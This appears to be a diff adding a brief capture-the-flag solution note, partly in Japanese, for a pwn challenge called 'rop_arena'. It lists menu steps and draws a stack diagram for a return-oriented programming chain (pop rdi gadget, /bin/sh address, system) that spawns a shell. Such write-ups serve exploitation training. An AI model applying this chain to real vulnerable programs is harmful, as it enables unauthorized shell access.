@@ -1,0 +1,21 @@
+8.show menu で/bin/shのアドレスを確認する
+0x404070
+
+2.append "pop rdi; ret" addr
+
+1.append hex value
+
+3.append "system" addr
+
+0.excute rop
+
+rop_arena
+
+     rop_arena
++--------------------+
+| pop rdi; ret       |<- rop start
++--------------------+
+| 0x0000000000404070 |
++--------------------+
+| system             |
++--------------------+
